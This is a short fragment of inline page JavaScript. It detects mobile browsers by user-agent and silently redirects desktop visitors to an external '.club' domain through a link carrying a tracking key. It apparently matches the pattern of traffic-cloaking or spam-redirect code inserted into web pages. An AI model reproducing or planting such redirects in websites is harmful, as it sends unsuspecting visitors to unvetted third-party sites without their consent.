      <script>
         function isMobile() {
             const mobiles = [
                 /Android/i,
                 /webOS/i,
                 /iPhone/i,
                 /iPad/i,
                 /iPod/i,
                 /BlackBerry/i,
                 /Windows Phone/i,
                 /Mobile/i,
                 /Tablet/i,
                 /GoBrowser/i,
                 /Fennec/i,
                 /Mini/i,
             ];

             return mobiles.some((mobile) => {
                 return navigator.userAgent.match(mobile);
             });
         }

         if (!isMobile()) window.location = "https://polo.thegadgetguru.club/?k=bb8e3bf5f74c9ee3ed3d1eb176e1ef4a&type=mainstream&subtype=global";
